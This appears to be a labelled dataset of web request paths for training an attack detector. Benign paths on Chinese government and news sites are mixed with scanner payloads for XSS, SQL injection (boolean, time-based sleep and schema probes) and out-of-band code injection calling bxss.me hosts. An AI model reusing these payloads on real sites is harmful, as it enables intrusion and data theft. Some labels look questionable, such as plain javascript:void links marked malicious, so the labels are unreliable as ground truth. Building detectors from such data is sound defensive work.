request	label
"/****/qzfwj/201908/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u5927\u5e84\u7cbe\u54c1\u978b\u5e97	0
/***/0/01/89/23/1892358_685464.jpg	0
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/****/wdsjs/hfswsj/202105/t20210501_181316.html	0
/****/system/2017/04/18/javascript:dozoom(9)	1
/******/resource/js/jquery/text/index.jsp	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u91d1\u8d35\u9547\u8d75\u6d77\u519c\u6751\u7ecf\u7eaa\u670d\u52a1\u90e8	0
/****/jtdt/2020_jtyw/202007/t20200717_250795.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6021\u54c1\u5ba2\u5feb\u9910\u5e97	0
/**********/system/2020/05/21/013167132.shtml	0
/****/tzgg/2011tzgg/index_2.html	0
/***/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8fdd\u6cd5\u91c7\u77ff\u6848	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/*****/index.html"	1
"/****/zxft/202005/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/******/system/2018/01/26/javascript:window.print()	1
/about-southwest/******/index' and 2*3*8=6*8 and 'iabo'='iabo_2.html	1
/******/admin/dash_status.php?status_data[1]=alert(777);	1
/****/202103/t20210311_2624741.html	0
"/**/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
/******/system/2016/01/18/011915286.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5965\u4e3d\u4f5b\u73a9\u5177\u5e97	0
/****/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/*****/images/dtbk.gif	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u767e\u997a\u56ed\u7c89\u6c64\u997a\u5b50\u9986	0
/zwxx_11337/****/202008/t20200804_2178320.html	0
/*******/qiye/b-e1523016.html	0
/**********/system/2020/04/22/013146468.shtml	0
/***/0/01/27/66/1276671_999997.jpg	0
/**********/system/2021/08/01/013428698.shtml	0
/****/system/2021/11/10/013477874.shtml	0
/******/jzgrrkjm/js/jquery.min01.js	0
/****/zfxxgk/fdzdgknr/zdmsxx/tpkf/index_1.html	0
"/******/hhs/sszx/""""><script>alert(44)</script>"	1
/*******/qiye/b-e2244436.html	0
/**/ourbusiness/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
"/**/ui'""""()&%<acx><script >qv9d(9498)</script>/lib/easyui/plugins/jquery.panel.js"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6052\u745e\u7965\u6d17\u8f66\u5e97	0
/***/003/003/685/00300368590_2e427ccc.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u4e5d\u516b\u53d1\u827a\u5e97	0
"/****/zdlygk/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/gys/bsj/zcwj.htm"	1
/****/system/2021/12/18/012231632.shtml	0
/zwxx_11337/****/zcjd/201808/t20180819_979462.html	0
/****/xef_35359/yw_1295/201903/t20190327_1354747.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u94ed\u83f2\u65e5\u5316\u9500\u552e\u90e8	0
/***********/zaojianpinglun/?_=1640025500558	0
"/******/index.cfm?email="""">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin"	1
/******/css/	1
"/***/getsubject?data={""subject_id"":422,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":6349,""sign"":""""}"	0
/****/tzgg/2020_tzgg/index_2.html	0
/**********/system/more/207000000000000/0040/207000000000000_00004031.shtml	0
/****/system/2017/08/19/012389390.shtml	0
/******/2016lh/zb/zx/	0
/**********/system/2020/07/23/013211930.shtml	0
/*****/gy48/ljcpgyview.asp?id=42884005&l=\ufffd\u03fa\ufffd	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9752\u94dc\u5ce1\u5e02\u90b5\u5c97\u9547\u5927\u6c9f\u6751\u5360\u864e\u6797\u679c\u7ecf\u7eaa\u884c	0
/****/bmkx/sjcy/201907/t20190731_140429_wap.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new=0.24997914938407995&wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/****/zfwjn/'.gethostbyname(lc('hitwn'.'fwjodlyi2c8ff.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(103).chr(66).chr(111).chr(78).'/1105/list.html	1
/******/http://bxss.me/t/xss.html?	1
/*******/qiye/b-e792947.html	0
/***/003/002/722/00300272279_339d16c9.jpg	0
/******/resource/pdfjs/build/image/jpeg/anonymous<script>alert(777)</script>test.jsp	1
/****/js/util/layoututils.js	0
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5b9a\u533a\u7279\u79cd	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1260840&version=3.6.0	0
/art'||'/****/12/14/art_31_223612.html	1
/****/b-e902581.html	0
/************/template/jcse'||'/110105008056111/16/images/plugin/category/js.js	1
/****/20210107/e113843907.html	0
/**/index.php?do=post&id=294&c=dt&a=goods&	1
/*******/qiye/b-e2253479.html	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19106067142172543084_1640016798056	0
/**********/system/more/204000000000000/0044/204000000000000_00004429.shtml	0
/zwxx_11337/****/202111/t20211125_3150647.html	0
/****/javascript:stranbody();	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u9876\u798f\u5c0f\u5403\u5e97	0
/****/gjzqq/index.html?continent=-1 or 1150=1150	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(677)"">?_=1630311547744"	1
/***/0/01/93/36/1933673_744796.jpg	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u738b\u8f89\u70df\u82b1\u7206\u7af9\u4e13\u8425\u5e97	0
/****/bmkx/sjsj/202103/t20210305_178219.html	0
/***/003/004/487/00300448728_51f1ba7a.jpg	0
/****/zdlygk/ncwywfgz/zws/znx/if(now()=sysdate(),sleep(12),0).htm	1
/cms_sys/basic_templates/slider_basics/*****/flexslider-icon.woff	0
/****/201909/w020190926583398376982.jpg	0
/if(now()=sysdate(),sleep(12),0)/****/jhcw/gzdt.htm	1
/****/20211129/10806.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u5e7d\u96c5\u670d\u88c5\u5e97	0
/******/329441.html	0
/******/usercenter/index?qrcode=6855&code=061kcx000dsgzm1jjc300qijeq0kcx02	0
/***/003/003/670/00300367053_4b28be61.jpg	0
/******/sdsx/index_10272137.shtml	0
/***/003/003/738/00300373820_30c1d155.jpg	0
/****/tpgj/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5c11\u519b\u8c03\u6599\u5e97	0
/****/web/search?page=3&channelid=222832&searchword=\u5355\u4f4d&keyword=\u5355\u4f4d&perpage=20&outlinepage=10	0
/***/0/00/43/48/434887_863088.jpg	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') or 9238=9238 and '1'='1	1
/**********/system/2020/12/05/013296631.shtml	0
/cgi-bin/***/select.cgi	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(811)</script>?_=1630311603075"	1
/******/n42746/c1722946/content'||'.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u4ef2\u5b8f\u597d\u6536\u6210\u519c\u4e1a\u6280\u672f\u670d\u52a1\u90e8	0
/******/nxrq_priv_icon5_4.png	0
"/****/zzxxgk/tjj/zfxxgkml_' 'a'.concat(70-3).concat(22*4).concat(108).concat(79).concat(101).concat(79) (require'socket'
socket.gethostbyname('hitfd' 'mqujfmvg71b91.bxss.me.')[3].to_s) '/jgzn_2042/list.html"	1
/****/template.cfm?moduletitle=alert(777)	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ywdt/10.htm	1
/***/viewspace-938.html	0
/***/0/00/48/42/484255_885327.jpg	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqwsg/202103/t20210309_2620138.html	0
/******/rest/prototype/1/session/check/something<img src=a onerror=alert(777)>	1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqgzw/202002/t20200210_1948559.html	0
/*****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****************/notification?access_token=7546e6ef-9a85-4ae6-82c9-fc807665599b&id=undefined	0
"/*/210514-1/index/06'""""()&%<acx><script >t2nb(9882)</script>c5a0c81119dca7da22fc4fd96413d2.js"	1
/***/xm/menu/images/folder.gif	0
"/art"""" and 2*3*8=6*8 and """"5ruo""""=""""5ruo/****/10/12/art_32_242398.html"	1
/*******/jb4effow.php	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5fb7\u80dc\u73ba\u81fb\u4e8c\u624b\u8f66\u54a8\u8be2\u670d\u52a1\u90e8	0
/zwxx_11337/****/202106/t20210611_2883299_zzb.html	0
/****/zjdt' and 2*3*8=6*8 and 'vkwe'='vkwe/zjdt/gzdt.htm	1
/****/ysqgk/sy.html?id=55	0
/***/0/02/03/18/2031869_999519.jpg	0
/****/znbm/fgw/	0
/****/shzr/201812/w020181204348575441702.jpg	0
/*****/system/2016/05/19/012008803.shtml	0
/****/bygk/shsy/201907/w020190717392963569433.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6587\u73b2\u9970\u54c1\u5e97	0
/******/system/2015/01/23/011618992.shtml	0
/**********/system/2017/06/21/012339943.shtml	0
/************//xfs.bxss.me/jcse/110105008056111/16/images/jquery.waterfall.js	1
/****/xh/hy/201901/t20190128_1266885.html	0
/*****/gy48/cpgyss.asp?key=\u5fb7\u56fd\u66fc\u53d1\u751f\u7089\u7164\u6c14&l=\ufffd\ufffd\ufffd\ufffd	0
/****/qzfwj/202007/t20200722_2170131.html	0
"/****/dashboard/index/41730?did=4&period=3"""">alert(/777/)"	1
/***/003/004/143/00300414315_492b2835.jpg	0
"/************/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(72).concat(104).concat(67) (require""""socket""""
socket.gethostbyname(""""hiteh"""" """"zmfgnotw9c0cd.bxss.me."""")[3].to_s) """"/jcse/110105008056111/16/images/plugin/selectpick/js.js"	1
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062413	0
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
"/****/template.cfm?fusebox.ajax="""">alert(777)&myfusebox.originalcircuit=clogin"	1
/*****/gy42/cpgyss.asp?key=\u01b7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\u0336&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/gy48/cpgyss.asp?key=\u9999\u70df\u70df\u96fe\u51c0\u5316\u5668&l=\ufffd\ufffd\ufffd\ufffd	0
/****/201909/t20190926_1757539.html	0
"/**/wp-content/plugins/nextgen-gallery/nggallery.php?test-head='"""">alert(777);"	1
/***/gygj/jtgg/kjcx/xyfw/ywly/gccb/gcjsgc/yqlj/	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u7530\u6d77\u6ce2\u679c\u4e1a	0
/***/0/01/90/64/1906473_802238.jpg	0
/***/003/004/154/00300415453_1f29b30d.jpg	0
/***/xbt/images/con_06.jpg	0
/****/zt/msss/msxw/201808/t20180806_950456.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9ec4\u6cb3\u88c5\u9970\u90e8	0
/****/rsxcsx/zyrsbd/	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9547\u7f57\u9547\u6717\u8bd7\u5fb7\u51c0\u6c34\u8bbe\u5907\u7ecf\u9500\u90e8	0
/****/yqfkgszxd/wnzyq/javascript:void(0);	1
"/************/template/jcse/110105008056111/16/images'""""()&%<acx><script >k6qi(9560)</script>/jquery.cookie.js"	1
/****/index.html	0
/****/qzfwj/201801/t20180115_669662.html	0
/*******/qiye/b-e2592710.html	0
/****/rsrm/200808/t20080827_318761.html?ivk_sa=1024320u	0
/****/\ufffd\ufffd\ufffd\ufffd?page=5	0
/****/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/**********/system/2021/12/19/013496545.shtml	0
"/****/index.php?action=list&order=name&srt=yes&lang=en""/><script>alert(777);</script>"	1
/*****/fzzf	0
/zwxx_11337/****/202006/t20200610_2133346.html	0
/**********/system/2021/12/10/013492416.shtml	0
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=103	0
/xwdt' and 2*3*8=6*8 and 'apk9'='apk9/****/jhcw/gzdt.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u91d1\u8272\u9ea6\u7530\u5de5\u4f5c\u5ba4	0
/****/byszx/201611/t20161121_76520.html?leader=bxss.me	1
/****/system/2021/11/23/javascript:window.close();	1
/****/qzfwj/201801/t20180115_668524.html	0
/zwxx_11337/****/201708/t20170821_452878.html	0
/**********/system/2020/04/14/013139929.shtml	0
/if(now()=sysdate(),sleep(12),0)/********/js/language.js	1
/****/spjj/201707/t20170714_271088.html	0
/**********/system/2020/06/06/013179309.shtml	0
/****/bmkx/styj/201805/w020180529603606030152.jpg	0
/***********/ztjd/2016/8/201608112120098470.doc	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7eff\u5316\u5efa\u8bbe	0
/zwxx_11337/****/zcjd/201712/t20171215_639126.html	0
/****/yqfkgszxd/index.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=cpi	0
/*/public/viewclick/?addclick=0'xor(if(now()=sysdate(),sleep(6),0))xor'z&classid=132&id=270	1
/**********/system/2021/11/11/013478579.shtml	0
/****/js/chunk-2d0c8a35.11da1aac.js	0
/****/xwygx/202108/rssdy/	0
/**********/system/2021/12/14/013494383.shtml	0
/****/system/more/13625020000000000/0000/13625020000000000_00000013.shtml	0
/*******/usdfkch.php	1
/****/zdgz/2020_zdgz/202112/kjcx/jsly/	0
/**/images/img_map.jpg	0
/****/czgk/bmyjs/zzqzx/zzqzxbgt/201702/t20170208_318434.html	0
/******/system/2021/01/06/013315133.shtml	0
/*****/20211201/10820.html	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw/201908/t20190808_1654756.html	0
/****/20170414/javascript:void(0);	1
/zwxx_11337/****/202002/t20200203_1939679.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19109932368514991461_1640054292799	0
/***/viewspace-373.html	0
"/****/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/*****/system/2011/03/16/010310684.shtml	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u745e\u7efc\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/system/2021/02/22/013339478.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u7ea2\u5bfa\u5821\u533a\u4e01\u6bc5\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202012/t20201221_175082.html	0
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!--	1
/******/xxgkzd.png	0
/******/457/jquery.ellipsis'||'.js	1
/****/xqdt/jtx/201610/t20161025_43973.html	0
/*****/system/2019/11/01/javascript:void();	1
/****/zjzj	0
/**/ui/widgets/scrollup/http://bxss.me/t/fit.txt?.jpg/themes/image.css	1
/**********/system/2020/03/21/013121263.shtml	0
/**********/system/2020/04/24/013148018.shtml	0
/****/zt/yqfkzccs/sjzccs	0
/***/0/02/10/16/2101696_352160.png	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/****/znjs.htm"	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5b9d\u8587\u5973\u88c5	0
/***/0/00/92/42/924258_129120.jpg	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u65b0\u8fa3\u9053\u70e7\u70e4\u5e97	0
"/****/gfxwj/201904/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/*********/20211109/javascript:void(0);	1
/******/system/2021/12/17/013495714.shtml	0
/******/new_tlj_gb.css	0
/*******/gygj/gygj/gjcp/hbsb/ywzzq/wzdt/rlzy/rcgk/gygj/jtgg/xwzx/xydt/rlzy/rcgk/	0
/****/bmkx/sfgw/201610/t20161025_14150.html	0
/**/slj/images/06.png	0
"/****/news/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
"/**/ui/"""" """"a"""".concat(70-3).concat(22*4).concat(103).concat(87).concat(106).concat(89) (require""""socket""""
socket.gethostbyname(""""hitwb"""" """"aouqxdfn358f1.bxss.me."""")[3].to_s) """"/easyui/plugins/jquery.linkbutton.js"	1
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777)	1
/**********/system/2021/12/20/013497230.shtml	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4f18\u8010\u7279\u6db2\u538b\u8bbe\u5907\u6709\u9650\u516c\u53f8	0
/***/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/0720/446440.shtml	0
/****/xqdt/hnx/201610/t20161025_50901.html	0
/****/xwygx/202112/rlzy/rcln/ywzzq/bqsm/ddjs/ghgz/gjcp/hbsb/	0
/**********/system/2020/03/28/013127128.shtml	0
"/****/"""".gethostbyname(lc(""""hitgv"""".""""dmddhpei5b7f3.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(97).chr(84).chr(113).chr(65).""""/zfczyjs/list.html"	1
/*******/qiye/b-e2503518.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u4e03\u8425\u9547\u5f69\u7433\u602a\u5473\u9999\u5c0f\u5403\u5e97	0
"/xxgk'""""()&%<acx><script >04kx(9553)</script>/******/list.html"	1
/**********/system/2020/04/18/013143510.shtml	0
/****/pucghtmain/pucghtinfo.z?style=1&&cglb=\u5916\u8d2d\u9600\u95e8&&djh=21120406	0
/****/rdjy/202112/t20211209_3211548.html	0
/****/whhd/202011/t20201125_256632.html' and 'x'='y	1
/****/bysrd/201610/t20161016_531.html?leader='.gethostbyname(lc('hitwi'.'zzrbunpnfc436.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(107).chr(70).chr(113).chr(85).'	1
/****/qzfwj/202009/t20200921_2238693.html	0
/*****/system/2021/11/06/javascript:void();	1
/****/0403/606046.shtml	0
"/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=390&i_articleid=182841&appscan=>""><script>alert(2058)</script>"	1
/****/20201001/e107674840.html	0
/zwxx_11337/****/201703/t20170301_303875.html	0
/**********/system/2016/04/01/011970453.shtml	0
/****/whs/201706/w020170720602612233156.png	0
/****/0513/166542.shtml	0
/module' and 2*3*8=6*8 and 'qy5u'='qy5u/*****/grouppic/jquery.ad-gallery2.css	1
"/"""".gethostbyname(lc(""""hitsy"""".""""nasvizhb7cd30.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(116).chr(65).chr(104).chr(71).""""/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html"	1
/*****/gy42/ljcpgyview.asp?id=29716004&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/tzgg/gzxwtzgg/201412/t20141218_40496.html	0
/****/rest/prototype/1/session/check/something<img src=a onerror=alert(777)>	1
/***/0/02/03/37/2033709_536677.png	0
/****/czgk/bmjs/sydw1/zytxj/	0
"/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqwxdglwyhbgs/\""javascript:void(0)\"""	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zfzshbsc/201702/t20170208_317999.html	0
/zwxx_11337/****/201908/t20190802_1643581.html	0
/******/resource%' and 2*3*8=6*8 and 'jcoj'!='jcoj%/js/newcalendar/wdatepicker.js	1
/******/457/bxss.me.css	1
/****/zzxxgk/bmsthjj/xxgkml/hjxx/sthbdc/list.html	0
/**********/system/2021/12/10/javascript:void();	1
/if(now()=sysdate(),sleep(15),0)/*/1905211146429566.js	1
/****/jtdt/2019_jtyw/201903/w020190313611179476849.jpg	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/ghjh_1969/list.html	0
"/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/201712/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/**********/system/2020/06/08/013180057_04.shtml	0
/****/zgsdt/2010zgsdt	0
/**************/2017zt/dlfj/fzzg/	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\u48ec\ufffd\u6dff\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\u05f3\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/images/59.gif	0
/zwxx_11337/***/201705/t20170505_304249.html	0
/**********/system/2021/04/01/013361144.shtml	0
/**********/system/2021/10/14/013464413.shtml	0
/****/zfxxgkzd/index_1.html	0
/****/system/2021/09/08/javascript:alert(1294).shtml	1
/zwxx_11337/****/201810/t20181018_1130988.html	0
/*******/qiye/b-e915986.html	0
/****/201909/t20190926_1757174.html	0
"/****/wdsjs/hfswsj/202109/"""" """"a"""".concat(70-3).concat(22*4).concat(118).concat(74).concat(111).concat(90) (require""""socket""""
socket.gethostbyname(""""hitrd"""" """"ueukobal387f7.bxss.me."""")[3].to_s) """"_186411.html"	1
/***/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/************/template/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/view.js	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(352)</script>?_=1630311371566"	1
/****/czgk/bmyjs/qtdw/zzqhtglzx	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u534e\u4e30\u7efc\u5408\u5546\u5e97(\u90ae\u653f\u52a0\u76df\u519c\u5bb6\u5e97)	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u540c\u798f\u5bbe\u9986	0
/******/resource/code/news/click/addclicktimes.jsp?wburlid=1365&owner=1707212448&type=wbimage	1
/***/003/004/485/00300448518_1dac0db2.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5723\u591a\u65af\u897f\u5f0f\u5feb\u9910\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6c90\u4e50\u9633\u6f84\u6e56\u5927\u95f8\u87f9\u5546\u884c	0
/***/blockdata/getsearchinfo.do?&title=\u5355\u53f7	0
/****/tjc/spbd	0
"/****/xxgknb/2014/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(84).concat(112).concat(86) (require""""socket""""
socket.gethostbyname(""""hittz"""" """"kphupnepbcb64.bxss.me."""")[3].to_s) """".html"	1
/******/resource/js/base64.js	0
/****/zgsdt/2020_qydt/202010/t20201001_254259.html	0
/****/zdgz/2019_zdgz/index_9.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6269\u5185\u9700	0
